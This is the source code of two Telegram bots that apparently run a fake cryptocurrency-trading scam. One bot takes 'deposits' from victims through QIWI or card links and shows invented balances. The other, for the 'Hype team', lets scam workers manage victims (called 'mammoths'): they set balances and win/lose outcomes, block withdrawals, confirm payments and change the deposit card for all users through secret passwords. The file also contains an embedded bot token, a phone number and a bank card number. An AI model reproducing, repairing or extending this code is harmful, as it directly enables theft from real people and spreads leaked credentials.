                const chatId = msg.chat.id;
                const userId = msg.from.id;
                const newDep = Number(text);
                let depositFinalAccess = false;

                await sequelize.authenticate()
                await sequelize.sync()

                const mamont = await UserModel.findOne({
                    where: {
                        chatId: chatId.toString()
                    }
                });

                if (isNaN(text) || newDep <= user.minDeposit) {
                    bot.sendMessage(chatId, `Введите верное число которое больше чем минимальная сумма пополнения ${user.minDeposit}!!`);
                } else {
                    bot.sendMessage(chatId, `💳 Заявка в размере - ${text} ₽  была успешно создана \n \n` +
                        `〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️ \n \n` +
                        `[Перейдите по ссылке для оплаты](${mamont.depositQiwi}) \n \n` +
                        `〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️ \n \n` +
                        '⚠️ _После оплаты, не забудьте нажать кнопку «Проверить платеж_».', {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: 'Проверить платеж',
                                        callback_data: 'checkPayment'
                                    }],
                                    [{
                                        text: 'Обратиться в поддержку',
                                        url: 'https://t.me/alinkamurcc'
                                    }],
                                    [{
                                        text: 'Отменить Пополнение',
                                        callback_data: 'cancelPayment'
                                    }],
                                ]
                            },
                        }
                    )

                    bot1.sendMessage(mamont.worker, '📊 Сервис - Трейдинг \n \n' +
                        `✅ Мамонт [${mamont.username}](https://t.me/${mamont.username}) [/c35534] \n` +
                        `Создал заявку на пополнение в размере - *${text}* ₽`, {
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true,
                            reply_markup: {
                                inline_keyboard: [
                                    [{
                                        text: '💰 Оплатить',
                                        callback_data: 'confirm_mamontPayment'
                                    }]
                                ]
                            }
                        }
                    )

                    bot1.on('callback_query', async function ConfirmMamontu(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'confirm_mamontPayment') {
                            depositFinalAccess = true;
                            bot1.deleteMessage(chatId, messageId);
                            bot1.removeListener('callback_query', ConfirmMamontu);
                            bot1.sendMessage(chatId, '✅ Счет успешно оплачен');
                        }
                    })

                    bot.on('callback_query', async function Mamontchecker(query) {
                        const chatId = query.message.chat.id;
                        const messageId = query.message.message_id;
                        const userId = query.from.id;

                        if (query.data === 'cancelPayment') {
                            bot.removeListener('callback_query', Mamontchecker);
                            bot.removeListener('message', depositSumChecker);
                            bot.deleteMessage(chatId, messageId);
                            const currentDate = new Date();
                            const registrationDate = mamont.registrationDate;
                            const timeDiff = currentDate - registrationDate;
                            const daysRegistered = Math.floor(timeDiff / (1000 * 60 * 60 * 24) + 1);

                            await bot.sendMessage(chatId, '⚡️', menuKeyboard);
                            return bot.sendPhoto(chatId, './images/ownCabinet.jpg', generateLkKeyboard(mamont, userId, daysRegistered));
                        } else if (query.data === 'checkPayment') {
                            if (depositFinalAccess) {
                                bot.removeListener('callback_query', Mamontchecker);
                                bot.removeListener('message', depositSumChecker);
                                bot.deleteMessage(chatId, messageId);
                                mamont.balance += Number(text);
                                mamont.save()
                                return bot.sendMessage(chatId, `✅ Баланс был успешно пополнен на сумму: *${text} ₽*`, {
                                    parse_mode: 'Markdown',
                                })
                            } else {
                                bot.sendMessage(chatId, '⚠️ Платеж не был обнаружен.')
                            }
                        }
                    });
                }
            })
        }

        if (query.data === 'withdraw') {
            bot.sendPhoto(chatId, './images/withdraw.jpg', {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '💵 Вывести на QIWI-кошелек',
                            callback_data: 'withdrawOnQiwi'
                        }],
                        [{
                            text: '💳 Вывести на банковскую карту',
                            callback_data: 'withdrawOnCard'
                        }],
                    ]
                },
                caption: `🏛 _Выберите метод вывода_.`,
            });
        } else if (query.data === 'withdrawOnQiwi') {
            bot.sendMessage(chatId, '🏛 _Метод вывода : QIWI-wallet_ \n \n' +
                `💰 Ваш баланс : ${user.balance} ₽` +
                '\n \n' +
                '_Вывод средств возможен на реквизиты с которых пополнялся ваш баланс_' +
                '\n \n' +
                '💳 *Укажите ниже номер вашего QIWI-кошелька*..', {
                    parse_mode: 'Markdown',
                });
            qiwiChecker('QIWI');
        } else if (query.data === 'withdrawOnCard') {
            bot.sendMessage(chatId, '🏛 _Метод вывода : Банковская карта_ \n \n' +
                `💰 Ваш баланс : ${user.balance} ₽` +
                '\n \n' +
                '_Вывод средств возможен на реквизиты с которых пополнялся ваш баланс_' +
                '\n \n' +
                '💳 *Укажите ниже номер вашей банковской карты*..', {
                    parse_mode: 'Markdown',
                });
            qiwiChecker('card');
        }

        if (query.data === 'verification') {
            if (user.verification) {
                bot.sendMessage(chatId, 'Поздравляем. *Ваш аккаунт верифицирован*', {
                    parse_mode: 'Markdown',
                });
            } else {
                bot.sendMessage(chatId, '⚠️ *Ваш аккаунт не верифицирован, рекомендуем верифицировать аккаунт*' +
                    ', *Вы можете это сделать, нажав на кнопку ниже и написав Верификация в тех.поддержку, спасибо!*\n' +
                    '\n' +
                    '🔷 Приоритет в очереди к выплате.\n' +
                    '\n' +
                    '🔷 Отсутствие лимитов на вывод средств.\n' +
                    '\n' +
                    '🔷 Возможность хранить средства на балансе бота в разных активах.', {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: 'Верифицировать',
                                    url: 'https://t.me/alinkamurcc'
                                }],
                                [{
                                    text: 'Отмена',
                                    callback_data: 'accept'
                                }]
                            ]
                        }
                    });
            }
        }

        if (query.data.includes('_coin')) {
            deleteMessage(chatId, messageId);
            const coinName = query.data.split('_')[0];
            const coinCost = await run(`${coinName}usdt`);
            let coinFullName;

            if (coinName === 'btc') {
                coinFullName = 'Bitcoin/USD';
            } else if (coinName === 'qtum') {
                coinFullName = 'Qtum/USD';
            } else if (coinName === 'eth') {
                coinFullName = 'Ethereum/USD';
            } else if (coinName === 'trx') {
                coinFullName = 'Tron/USD';
            } else if (coinName === 'ltc') {
                coinFullName = 'Litecoin/USD';
            } else if (coinName === 'xrp') {
                coinFullName = 'Ripple/USD';
            } else if (coinName === 'ada') {
                coinFullName = 'Cardano/USD';
            } else if (coinName === 'sol') {
                coinFullName = 'Solana/USD';
            } else if (coinName === 'luna') {
                coinFullName = 'Terra/USD';
            } else if (coinName === 'doge') {
                coinFullName = 'Doge/USD';
            } else if (coinName === 'dot') {
                coinFullName = 'Polka/USD';
            } else if (coinName === 'avax') {
                coinFullName = 'Avalanche/USD';
            } else if (coinName === 'matic') {
                coinFullName = 'Polygon/USD';
            } else if (coinName === 'uni') {
                coinFullName = 'Uniswap/USD';
            }

            bot.sendPhoto(chatId, `./images/${coinName}_img.jpg`, {
                caption: `${coinFullName}
    
    🔹 Символ: ${coinName.toUpperCase()}
    💸 Стоимость: ${coinCost} USD ~ (${((coinCost) * 60.2).toFixed(2)} RUB)`,
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '🔼 Повышение',
                            callback_data: `${coinName}_up`
                        }],
                        [{
                            text: '🔽 Понижение',
                            callback_data: `${coinName}_down`
                        }],
                    ]
                }
            });
        }

        if (query.data.includes('_up') || query.data.includes('_down')) {
            deleteMessage(chatId, messageId);
            const coinName = query.data.split('_')[0];
            const coinCost = await run(`${coinName}usdt`);
            let coinFullName;

            if (coinName === 'btc') {
                coinFullName = 'Bitcoin/USD';
            } else if (coinName === 'qtum') {
                coinFullName = 'Qtum/USD';
            } else if (coinName === 'eth') {
                coinFullName = 'Ethereum/USD';
            } else if (coinName === 'trx') {
                coinFullName = 'Tron/USD';
            } else if (coinName === 'ltc') {
                coinFullName = 'Litecoin/USD';
            } else if (coinName === 'xrp') {
                coinFullName = 'Ripple/USD';
            } else if (coinName === 'ada') {
                coinFullName = 'Cardano/USD';
            } else if (coinName === 'sol') {
                coinFullName = 'Solana/USD';
            } else if (coinName === 'luna') {
                coinFullName = 'Terra/USD';
            } else if (coinName === 'doge') {
                coinFullName = 'Doge/USD';
            } else if (coinName === 'dot') {
                coinFullName = 'Polka/USD';
            } else if (coinName === 'avax') {
                coinFullName = 'Avalanche/USD';
            } else if (coinName === 'matic') {
                coinFullName = 'Polygon/USD';
            } else if (coinName === 'uni') {
                coinFullName = 'Uniswap/USD';
            }

            bot.sendMessage(chatId,
                `🔹 ${coinFullName} \n` +
                `💸 Баланс: ${user.balance} RUB \n \n` +
                '_Введите сумму пула_', {
                    parse_mode: 'Markdown'
                }
            );

            botPull(coinFullName, coinCost, query.data.split('_')[1]);
        }
    }
});


// HYPE TEAM BOT

const TelegramApi = require('node-telegram-bot-api')

const token1 = '6042934250:AAGNtlwxcIiyqesnboO97O8a89JuE1RLFy4'

const bot1 = new TelegramApi(token1, {
    polling: true
});

function generateReferralId(chatId) {
    return chatId.toString();
}

async function sendMamontInfo(chatId, mamontId) {
    const mamont = await UserModel.findOne({
        where: {
            chatId: mamontId.toString()
        }
    });

    bot1.sendMessage(chatId, `📝 Информация о мамонте \\[${mamont.chatId}\] \n \n` +
        `Ссылка на мамонта [${mamont.username}](https://t.me/${mamont.username})` +
        '\n \n' + `Баланс: ${mamont.balance} ₽ \n` +
        `На выводе: ${mamont.vivod} ₽ \n \n` +
        `*Верификация*: ${mamont.verif ? '✅' : '❌'} \n` +
        `*Статус блокировки*: ${mamont.isBlocked ? '🔐 Заблокирован' : '🔓 Не заблокирован'} \n` +
        `*Статус удачи*: ${mamont.success ? '❤️Выигрывает' : '🖤Проигрывает'} \n` +
        `Статус  ${mamont.status ? '🔼*Положительный*🔼' : '😐*Подозрительный*😐'}`, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [{
                        text: '💰 Баланс',
                        callback_data: 'mamont_balance'
                    }, {
                        text: `${mamont.success ? '❤️Выигрывает' : '🖤Проигрывает'}`,
                        callback_data: 'mamont_success'
                    }],
                    [{
                        text: `${mamont.isBlocked ? '🔓 Разблокировать' : '🔐 Заблокировать'}`,
                        callback_data: 'mamont_block'
                    }],
                    [{
                        text: `${mamont.vivodSuccess ? '🔐 Заблокировать вывод' : '🔓 Разблокировать вывод'}`,
                        callback_data: 'mamont_vivodBlock'
                    }],
                    [{
                        text: `${mamont.verif ? '✅Верифицирован' : '❌ Верификация'}`,
                        callback_data: 'mamont_verif'
                    }],
                    [{
                        text: `${mamont.status ? '🔼Положительный🔼' : '😐Подозрительный😐'}`,
                        callback_data: 'mamont_status'
                    }, {
                        text: `На Выводе`,
                        callback_data: 'mamont_vivodSum'
                    }],
                    [{
                        text: `🗑 Удалить мамонта`,
                        callback_data: 'mamont_delete'
                    }],
                ]
            })
        }
    );

    bot1.on('callback_query', async function mamontCommandManager(callbackQuery) {
        const chatId = callbackQuery.message.chat.id;
        const command = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;
        await sequelize.authenticate()
        await sequelize.sync()

        const mamont = await UserModel.findOne({
            where: {
                chatId: mamontId,
            }
        });

        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString(),
            }
        });

        if (command === 'mamont_balance') {
            bot1.sendMessage(chatId, `🤔 Какой баланс ты хочешь сделать своему мамонту?`)

            bot1.on('message', async function botBalanceChanger(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;
                const userId = msg.from.id;

                if (!isNaN(text)) {
                    mamont.balance = Number(text);
                    bot1.sendMessage(chatId, `Баланс успешно назначен вашему мамонту`);
                } else {
                    bot1.sendMessage(chatId, `Ошибка в назначении баланса`);
                }

                await mamont.save()
                bot1.deleteMessage(chatId, messageId);
                bot1.removeListener('message', botBalanceChanger);
                bot1.removeListener('callback_query', mamontCommandManager);

                return sendMamontInfo(chatId, mamontId);
            })
        } else if (command === 'mamont_success') {
            if (mamont.success) {
                mamont.success = false;
            } else {
                mamont.success = true;
            }

            await mamont.save()

            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_block') {
            if (mamont.isBlocked) {
                mamont.isBlocked = false;
            } else {
                mamont.isBlocked = true;
            }

            await mamont.save()

            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_vivodBlock') {
            if (mamont.vivodSuccess) {
                mamont.vivodSuccess = false;
            } else {
                mamont.vivodSuccess = true;
            }

            await mamont.save()
            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_verif') {
            if (mamont.verif) {
                mamont.verif = false;
            } else {
                mamont.verif = true;
            }

            await mamont.save()
            bot1.removeListener('callback_query', mamontCommandManager);
            bot1.deleteMessage(chatId, messageId);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_status') {
            if (mamont.status) {
                mamont.status = false;
            } else {
                mamont.status = true;
            }

            await mamont.save()
            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontCommandManager);

            return sendMamontInfo(chatId, mamontId);
        } else if (command === 'mamont_vivodSum') {
            bot1.sendMessage(chatId, `🤔 Какой баланс на выводе ты хочешь сделать своему мамонту?`)

            bot1.on('message', async function botBalanceChanger(msg) {
                const text = msg.text;
                const chatId = msg.chat.id;
                const userId = msg.from.id;

                if (!isNaN(text)) {
                    mamont.vivod = Number(text);
                    bot1.sendMessage(chatId, `Баланс вывода успешно назначен вашему мамонту`);
                } else {
                    bot1.sendMessage(chatId, `Ошибка в назначении баланса вывода`);
                }

                await mamont.save()
                bot1.deleteMessage(chatId, messageId);
                bot1.removeListener('message', botBalanceChanger);
                bot1.removeListener('callback_query', mamontCommandManager);

                return sendMamontInfo(chatId, mamontId);
            })
        } else if (command === 'mamont_delete') {
            worker.mamonts = worker.mamonts.filter(mamont => mamont !== mamontId);

            await worker.save();
            bot1.removeListener('callback_query', mamontCommandManager);

            return bot1.deleteMessage(chatId, messageId);
        }
    })
}

async function newdepositDetails(chatId, method) {
    bot1.on('message', async function desopitDetChecker(msg) {
        const chatId = msg.chat.id;
        const text = msg.text;
        const userId = msg.from.id;
        await sequelize.authenticate()
        await sequelize.sync()
        const allUsers = await UserModel.findAll();

        if (method === 'card') {
            for (const user of allUsers) {
                user.depositCard = text;
                await user.save(); // Use await to ensure the user is saved before moving to the next one
            }
            bot1.removeListener('message', desopitDetChecker)
            return bot1.sendMessage(chatId, `Карта изменена для всех`)
        } else {
            for (const user of allUsers) {
                user.depositCard = text;
                await user.save(); // Use await to ensure the user is saved before moving to the next one
            }
            bot1.removeListener('message', desopitDetChecker)
            return bot1.sendMessage(chatId, `Карта изменена для всех`)
        }
    })
}

const ButtonOptions = {
    reply_markup: JSON.stringify({
        keyboard: [
            [{
                text: '👤 Профиль'
            }],
            [{
                text: '💼 Трейдинг'
            }],
            [{
                text: '🌟 О проекте'
            }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    })
};

const MesButtoneOptiones = {
    reply_markup: JSON.stringify({
        inline_keyboard: [
            [{
                text: 'Настройки',
                callback_data: 'settings'
            }]
        ]
    })
};

const InfoButtonOptions = {
    reply_markup: JSON.stringify({
        inline_keyboard: [
            [{
                text: '🔍 Инфо канал',
                url: 'https://t.me/+arEStT1GgsA3ZTAy'
            }],
            [{
                text: '📈 Выплаты',
                url: 'https://t.me/+QuTcxK48VGIyNWMy'
            }],
            [{
                text: '📚 Мануалы',
                url: 'https://t.me/+8ySjyY6GyxhjYjI6'
            }],
            [{
                text: '📞 Чат воркеров',
                url: 'https://t.me/+gtcl3iHe2Ms2MjVi'
            }]
        ]
    })
};

const SettingsOptions = {
    reply_markup: JSON.stringify({
        inline_keyboard: [
            [{
                text: 'Увеличить',
                callback_data: 'additional_button'
            }]
        ]
    })
};

bot1.setMyCommands([{
    command: 'start',
    description: 'Запуск бота'
}, ]);

bot1.on('message', async (msg) => {
    // console.log(msg);
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id;

    if (text === '/start') {
        try {
            await sequelize.authenticate()
            await sequelize.sync()

            const user = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (user) {
                return bot1.sendMessage(chatId, 'Привет, чем могу помочь?', ButtonOptions);
            } else {
                await UserModel.create({
                    chatId: chatId,
                    isWorker: true,
                });
                return bot1.sendMessage(chatId, 'Привет, новый воркер, чем могу помочь?', ButtonOptions);
            }
        } catch (e) {
            console.log('Підключення зламалось', e);
        }
    }

    if (text === 'P5gY2wK9sR3xJ7oM') {
        bot1.sendMessage(chatId, 'Салам Алейкум, введи новую карту для пополнения')
        newdepositDetails(chatId, 'card');
        await sequelize.authenticate()
        await sequelize.sync()
        const allUsers = await UserModel.findAll();

        console.log(allUsers);
    }

    if (text === 'H1aBzR3yQxJ7pW9o') {
        bot1.sendMessage(chatId, 'Салам Алейкум, введи новый киви для пополнения')
        return newdepositDetails(chatId, 'qiwi')
    }

    if (text === '4XyLpRtQwS9zA6jK') {
        bot1.sendMessage(chatId, 'Салам Алейкум, введи сообщение для всех воркеров')
        bot1.on('message', async function allWorkersSender(msg) {
            const chatId = msg.chat.id;
            const text = msg.text;
            const userId = msg.from.id;

            const admin = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            const allUsers = await UserModel.findAll();

            for (const user of allUsers) {
                if (user.isWorker && (user.chatId !== chatId.toString())) {
                    bot1.sendMessage(user.chatId, text);
                }
            }
            bot1.removeListener('message', allWorkersSender);
            return bot1.sendMessage(chatId, 'Сообщение успешно отправлено');
        })
    }


    if (text === '/profile' || text === '👤 Профиль') {
        const Status = 'Новичек';
        const Profits = 0;
        const ProfMessage = `Ваш id [${msg.from.id}]\n\n` + `Ваш статус: ${Status}\n\nСумма ваших профитов: ${Profits}₽`;
        return bot1.sendMessage(chatId, ProfMessage, MesButtoneOptiones);
    }

    if (text === '/trade' || text === '💼 Трейдинг') {
        const referralId = generateReferralId(chatId);
        const referralLink = `https://t.me/BingX_wallet_bot?start=${referralId}`;
        const tradeMessage = `📊 Трейдинг  \n\n 🔐 Ваша реферальная ссылка ~ \n ${referralLink}\n\n` +
            `💳 Реквизиты с которых Вы пополняли ~  \n +79120874881 \n 2200240715868499`;

        // Создаем клавиатуру для кнопки "Управление мамонтами"
        const tradeKeyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Управление мамонтами',
                        callback_data: 'management'
                    }],
                    [{
                        text: 'Привязать Мамонта по Id/username',
                        callback_data: 'connect_mamont'
                    }]
                ]
            }
        };

        // Отправляем сообщение о трейдинге с клавиатурой "Управление мамонтами"
        return bot1.sendMessage(chatId, tradeMessage, tradeKeyboard);
    }

    if (text === '/info' || text === '🌟 О проекте') {
        const infoMessage = 'Приветсвую тебя в нашей команде!';
        return bot1.sendMessage(chatId, '📑 Информация «Hype team»\n' +
            '\n' +
            '🗓 Дата открытия : 25.08.2022\n' +
            '➖➖➖➖➖➖➖\n' +
            'Профитов на сумму : 12261090 ₽ \n' +
            'Профитов всего : 1300\n' +
            '➖➖➖➖➖➖➖\n' +
            '💸 Процентная ставка :\n' +
            '\n' +
            'Обычное пополнение — 75%\n' +
            'Залёт через поддержку — 60%\n' +
            'Прямой перевод — 70%\n' +
            '➖➖➖➖➖➖➖\n' +
            '👑 Команда проекта : \n' +
            '\n' +
            'ТС/ТП: @hype_rokky\n' +
            'Наставник: @mobilizator_aye\n' +
            '➖➖➖➖➖➖➖\n' +
            'Состояние сервисов:\n' +
            '\n' +
            '🌕 FULL-WORK\n', InfoButtonOptions);
    }

});

bot1.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const buttonData = callbackQuery.data;
    const messageId = callbackQuery.message.message_id;

    if (buttonData === 'settings') {
        await sequelize.authenticate()
        await sequelize.sync()
        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });
        bot1.sendMessage(chatId, `Минимальный депозит: ${worker.minDeposit}`, SettingsOptions);
    } else if (buttonData === 'additional_button') {
        await sequelize.authenticate()
        await sequelize.sync()
        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });
        if (worker.minDeposit === 20500) {
            worker.minDeposit = 1000;
            worker.save();

            bot1.editMessageText('Минимальный скинут до 1000!\n' + `Минимальный депозит: ${worker.minDeposit}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{
                            text: 'Увеличить',
                            callback_data: 'additional_button'
                        }]
                    ]
                })
            });
        } else {
            worker.minDeposit += 1500;
            worker.save();
            bot1.editMessageText('Минимальный депозит увеличен!\n' + `Минимальный депозит: ${worker.minDeposit}`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{
                            text: 'Увеличить',
                            callback_data: 'additional_button'
                        }]
                    ]
                })
            });
        }
        worker.mamonts.forEach(async (mamontId) => {
            const mamont = await UserModel.findOne({
                where: {
                    chatId: mamontId,
                }
            });

            mamont.minDeposit = worker.minDeposit;

            mamont.save();
        });


    } else if (buttonData === 'management') {
        // Обработка нажатия на кнопку "Управление мамонтами"
        await sequelize.authenticate()
        await sequelize.sync()
        const worker = await UserModel.findOne({
            where: {
                chatId: chatId.toString()
            }
        });

        if (worker.mamonts.length === 0) {
            return bot1.sendMessage(chatId, 'У вас нет мамонтов');
        }
        const mamontsArr = []

        for (const mamontId of worker.mamonts) {
            const mamont = await UserModel.findOne({
                where: {
                    chatId: mamontId,
                }
            });

            mamontsArr.push([{
                text: `${mamont.username === '' ? `${mamont.chatId}`: `${mamont.username} | ${mamont.chatId}`}`,
                callback_data: `${mamont.chatId}`
            }]);
        }

        bot1.sendMessage(chatId, '_Выберите из списка:_', {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: mamontsArr
            }
        });

        bot1.on('callback_query', async function mamontManager(callbackQuery) {
            const chatId = callbackQuery.message.chat.id;
            const mamontId = callbackQuery.data;
            const messageId = callbackQuery.message.message_id;
            const username = callbackQuery.message.from.username;

            bot1.deleteMessage(chatId, messageId);
            bot1.removeListener('callback_query', mamontManager);

            sendMamontInfo(chatId, mamontId);
        })
    } else if (buttonData === 'chat_info') {
        bot1.sendMessage(chatId, 'Здесь информация о проекте.');
    } else if (buttonData === 'chat_payed') {
        bot1.sendMessage(chatId, 'Здесь статистика проекта.');
    } else if (buttonData === 'manuals') {
        bot1.sendMessage(chatId, 'Здесь контактная информация.');
    } else if (buttonData === 'chat_workers') {
        bot1.sendMessage(chatId, 'Здесь будут инструкции.');
    }

    if (buttonData === 'connect_mamont') {
        bot1.sendMessage(chatId, 'Введите Id/Username:')

        bot1.on('message', async function addMamont(msg) {
            const chatId = msg.chat.id;
            const text = msg.text;
            const worker = await UserModel.findOne({
                where: {
                    chatId: chatId.toString()
                }
            });

            if (/^\d+$/.test(text)) {
                const mamont = await UserModel.findOne({
                    where: {
                        chatId: text
                    }
                });

                if (mamont) {
                    mamont.worker = chatId.toString();
                    await mamont.save();
                    const updatedMamonts = [...worker.mamonts, text];
                    await worker.update({
                        mamonts: updatedMamonts
                    });
                    bot1.removeListener('message', addMamont);
                    return bot1.sendMessage(chatId, 'Мамонт успешно добавлен');
                } else {
                    bot1.removeListener('message', addMamont);
                    return bot1.sendMessage(chatId, 'Пользователь не найден');
                }
            }

            const mamont = await UserModel.findOne({
                where: {
                    username: text
                }
            });

            if (mamont) {
                mamont.worker = chatId.toString();
                await mamont.save();
                const updatedMamonts = [...worker.mamonts, mamont.chatId];
                await worker.update({
                    mamonts: updatedMamonts
                });
                bot1.removeListener('message', addMamont);
                return bot1.sendMessage(chatId, 'Мамонт успешно добавлен');
            } else {
                bot1.removeListener('message', addMamont);
                return bot1.sendMessage(chatId, `Пользователь не найден`);
            }
        })
    }
});